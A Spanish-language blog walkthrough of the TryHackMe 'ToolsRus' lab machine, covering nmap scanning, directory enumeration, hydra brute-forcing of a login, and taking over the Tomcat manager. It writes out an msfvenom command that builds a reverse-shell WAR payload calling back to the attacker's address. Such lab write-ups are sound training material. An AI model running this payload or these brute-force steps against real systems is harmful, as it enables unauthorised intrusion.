---
layout: single
title: ToolsRus - Try Hack Me
excerpt: ToolsRus maquina catalogada de dificultad “Easy” esta maquina esta sobretodo centrada en el uso de diferentes herramientas además de un buen proceso de enumeración. Vamos a ver de que se trata.
date: 2022-02-26
classes: wide
header:
  teaser: /assets/images/thm-toolsrus/1.jpg
  teaser_home_page: true
  icon: /assets/images/thm.webp
categories:
  - TryHackMe
tags:  
  - dirbuster
  - nikto
  - metasploit
  - hydra
  - Easy
  
---

![](/assets/images/thm-toolsrus/1.jpg)

ToolsRus maquina catalogada de dificultad “Easy” esta maquina esta sobretodo centrada en el uso de diferentes herramientas además de un buen proceso de enumeración. Vamos a ver de que se trata.

## 1-Escaneo Nmap y enumeración de puertos.

Primero vamos a ver ante que sistema estamos, si ante una maquina Linux o una maquina Windows, lo comprobaremos en base al TTL de la maquina.
Vamos a utilizar la herramienta WhichSystem para en base al TTL veamos ante que maquina estamos.

![](/assets/images/thm-toolsrus/2.jpg)

Por la proximidad del TTL (63), estamos ante una maquina linux.

Personalmente además de Nmap me gusta utilizar la herramienta fastTCPscan , que realiza un escaneo TCP muy rapido. Simplemente para obtener más información y utilizar diferentes herramientas.

![](/assets/images/thm-toolsrus/3.jpg)

Ahora realizamos un escaneo con Nmap para descubrir todos los puertos abiertos: sudo nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.146.87 -oG allports

Utilizaremos los parametros -p- (Indicar todos los puertos) -sS (Utilizan un TCP Syn port scan) --min-rate 5000 (Indicar paquetes no mas lentos que 5000 paquetes por segundo) --open (Mostrar aquellos puertos que tengan un estatus "open") -vvv (Arrojar un poco de inforación mientras se realiza el escaneo) -n (No aplicar resolución DNS) -oG (Guardar archivo en formato grepeable)

Nmap nos devuelve todo esto:

```
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.146.87 -oG allports
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 14:14 CET
Initiating Ping Scan at 14:14
Scanning 10.10.146.87 [4 ports]
Completed Ping Scan at 14:14, 0.19s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:14
Scanning 10.10.146.87 [65535 ports]
Discovered open port 22/tcp on 10.10.146.87
Discovered open port 80/tcp on 10.10.146.87
Discovered open port 1234/tcp on 10.10.146.87
Discovered open port 8009/tcp on 10.10.146.87
Completed SYN Stealth Scan at 14:14, 12.29s elapsed (65535 total ports)
Nmap scan report for 10.10.146.87
Host is up, received echo-reply ttl 63 (0.040s latency).
Scanned at 2022-02-26 14:14:31 CET for 12s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1234/tcp open  hotline syn-ack ttl 63
8009/tcp open  ajp13   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
           Raw packets sent: 68307 (3.005MB) | Rcvd: 67722 (2.709MB)
```

Vemos que nos devuelve bastantes puertos abiertos. Algunos insteresantes son el puerto 80 (http) , 22 (ssh) y otros diferentes como el 1234 y 8009 que ahora veremos de que tratan.

A continuación vamos a realizar un escaneo más profundo a estos puertos con el siguiente comando:

nmap -sC -sV -p22,80,1234,8009 10.10.146.87 -oN ports

Parametros -sC (Utilizar scripts comunes) y -sV (Mostrar versiones y servicios) -p (Indicar puertos en especifico) -oN (Guardar el archivo)


Nmap nos devulve esto:

```
nmap -sC -sV -p22,80,1234,8009 10.10.146.87 -oN ports
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 14:16 CET
Nmap scan report for 10.10.146.87 (10.10.146.87)
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 55:4b:91:3c:9a:96:fe:e2:fc:6a:95:21:90:b5:db:bd (RSA)
|   256 59:4b:53:91:10:3b:0c:5c:40:b9:10:df:f8:1d:61:8e (ECDSA)
|_  256 d9:b2:69:b0:8b:3b:19:a2:7c:2d:6d:c9:68:4f:aa:65 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
```

Utilizaremos también whatweb para enumerar rapidamente el servicio http y ver ante que nos estamos enfrentando.

Nos duelve esto:

![](/assets/images/thm-toolsrus/4.jpg)


Vemos que nos arroja algo de información. En el puerto 80 tenemos una página que utiliza un servidor web Apache...
En el puerto 1234 tenemos un Apache-Coyote que a continuación veremos de que trata. 

## 2-Enumeración

Primero vamos a ver que aspecto contiene la página en el puerto 80.

![](/assets/images/thm-toolsrus/5.jpg)

Vemos que no hay practicamente nada, solo un comentario que nos dice que no esta disponible pero que hay otras partes de la web que sí.

Vamos a utilizar la herramienta gobuster para buscar directorios y contenidos en el mismo.

![](/assets/images/thm-toolsrus/6.jpg)

Tenemos un directorio llamado guidelines al que podemos acceder y otro llamado "protected" , al cual no.

Vamos a ver el contenido de guidelines

![](/assets/images/thm-toolsrus/7.jpg)

Solo tenemos un comentario el que nos dice. "¿Hola bob actualizastes ese servidor Tomcat?"

![](/assets/images/thm-toolsrus/8.jpg)

Vamos a ir al servidor al directorio protected haber que tenemos.

Vemos que tenemos un login.

![](/assets/images/thm-toolsrus/9.jpg)

Vamos a probar algun usuario y contraseña por defecto -> User: admin , Pass: admin , password...
Lo mismo con el usuario Bob -> User: Bob , Pass: Bob , admin , password...

Si tras probar las tipicas credenciales no podemos acceder, vamos a realizar fuerza bruta. Primero al usuario bob, si no conseguimos nada iremos con el usuario admin.

Utilizaremos la herramienta hydra para realizar este ataque.

![](/assets/images/thm-toolsrus/10.jpg)

En cuestion de segundos obtenemos la contraseña, asi que vamos a probarla y ver que tenemos detrás de ese panel de login.

![](/assets/images/thm-toolsrus/11.jpg)

Solo vemos un comentario que nos dice: "Esta página protegida se ha movido a puerto diferente" , por lo cual, vamos a continuar enumerando.

Vamos a probar las credenciales en la página de tomcat.

![](/assets/images/thm-toolsrus/12.jpg)

Vemos que ganamos acceso.

![](/assets/images/thm-toolsrus/13.jpg)

![](/assets/images/thm-toolsrus/14.jpg)

## 3-Ganando acceso a la maquina.

Una vez ya tenemos acceso al panel de administrador en tomcat, vamos a crear una reverse shell para conectarnos.
Lo aremos utilizando la consola meterpreter.

Primero crearemos un payload de la siguiente manera -> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.8.85 LPORT=4545 -f war -o rshell.war

![](/assets/images/thm-toolsrus/16.jpg)

Ahora vamos a abrir metasploit y a configurar un listener meterpreter.

Primero abrimos la herramienta metasaploit , luego configuraremos el modulo, las opciones del mismo y lo ejecutaremos.

![](/assets/images/thm-toolsrus/15.jpg)

Una vez creado el payload y estando en escucha, subiremos el archivo malicioso a la página de tomcat y lo abriremos.

![](/assets/images/thm-toolsrus/17.jpg)

Le daremos al boton de Browse, para buscar el archivo y una vez seleccionado seleccionamos el boton Deploy.

![](/assets/images/thm-toolsrus/18.jpg)

Ya tenemos el archivo subido a la página ahora solo con seleccionarlo nos devulve una reverse shell.

Una vez obtenida la reverse shell , vamos a escribir el comando "shell" para que nos de una consola interactiva y vamos a buscar la flag de root.

![](/assets/images/thm-toolsrus/19.png)

![](/assets/images/thm-toolsrus/20.jpg)

![](/assets/images/thm-toolsrus/final.png)























